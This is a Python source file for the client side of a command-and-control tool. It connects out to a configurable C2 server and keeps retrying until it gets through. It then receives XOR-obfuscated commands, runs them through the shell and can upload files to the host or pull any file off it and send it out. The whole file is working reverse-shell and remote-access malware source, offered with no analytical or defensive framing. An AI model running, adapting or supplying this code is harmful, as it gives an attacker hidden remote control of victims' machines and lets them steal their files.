import socket
import subprocess
import time
import os

SERVER_HOST = '127.0.0.1'  # Change this IP if needed
SERVER_PORT = 5555
KEY = 0x42  # Simple XOR key for encryption/decryption

def xor_encrypt_decrypt(data):
    return bytes([b ^ KEY for b in data])

def connect_to_server():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((SERVER_HOST, SERVER_PORT))
            print(f"[*] Connected to C2 server at {SERVER_HOST}:{SERVER_PORT}")
            return sock
        except Exception as e:
            print(f"[!] Connection failed: {e}. Retrying in 5 seconds...")
            time.sleep(5)

def main():
    sock = connect_to_server()
    current_dir = os.getcwd()
    try:
        while True:
            # Receive 4 bytes length prefix
            raw_len = b''
            while len(raw_len) < 4:
                chunk = sock.recv(4 - len(raw_len))
                if not chunk:
                    print("[!] Connection closed by server.")
                    return
                raw_len += chunk
            cmd_len = int.from_bytes(raw_len, 'big')

            # Receive the command of cmd_len bytes
            encrypted_command = b''
            while len(encrypted_command) < cmd_len:
                chunk = sock.recv(cmd_len - len(encrypted_command))
                if not chunk:
                    print("[!] Connection closed by server.")
                    return
                encrypted_command += chunk

            command = xor_encrypt_decrypt(encrypted_command).decode(errors='ignore').strip()
            print(f"[DEBUG] Received command: {command}")
            if not command:
                continue
            if command.lower() == 'exit':
                print("[*] Exit command received. Closing connection.")
                break

            # Handle 'cd' command to change directory
            if command.startswith('cd '):
                path = command[3:].strip()
                try:
                    os.chdir(path)
                    current_dir = os.getcwd()
                    output = f"Changed directory to {current_dir}\n".encode()
                except Exception as e:
                    output = f"cd: {e}\n".encode()
            elif command.startswith('upload '):
                # Format: upload <remote_path> <file_size>
                parts = command.split(' ', 2)
                if len(parts) < 3:
                    output = b'Invalid upload command format\n'
                else:
                    remote_path = parts[1]
                    try:
                        file_size = int(parts[2])
                        received_data = b''
                        while len(received_data) < file_size:
                            chunk = sock.recv(file_size - len(received_data))
                            if not chunk:
                                break
                            received_data += chunk
                        with open(remote_path, 'wb') as f:
                            f.write(received_data)
                        output = f'File uploaded to {remote_path}\n'.encode()
                    except Exception as e:
                        output = f'Upload error: {e}\n'.encode()
            elif command.startswith('download '):
                # Format: download <remote_path>
                parts = command.split(' ', 1)
                if len(parts) < 2:
                    output = b'Invalid download command format\n'
                else:
                    remote_path = parts[1]
                    try:
                        with open(remote_path, 'rb') as f:
                            file_data = f.read()
                        # Send file size first
                        sock.send(len(file_data).to_bytes(4, 'big'))
                        # Send file data
                        sock.sendall(file_data)
                        continue  # Skip sending output again
                    except Exception as e:
                        output = f'Download error: {e}\n'.encode()
            else:
                # Execute the command in the current directory
                try:
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, cwd=current_dir)
                except subprocess.CalledProcessError as e:
                    output = e.output

            encrypted_output = xor_encrypt_decrypt(output)
            print(f"[DEBUG] Sending output of length: {len(encrypted_output)}")
            # Send 4 bytes length prefix before sending encrypted output
            sock.send(len(encrypted_output).to_bytes(4, 'big'))
            sock.sendall(encrypted_output)
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        sock.close()

if __name__ == "__main__":
    main()
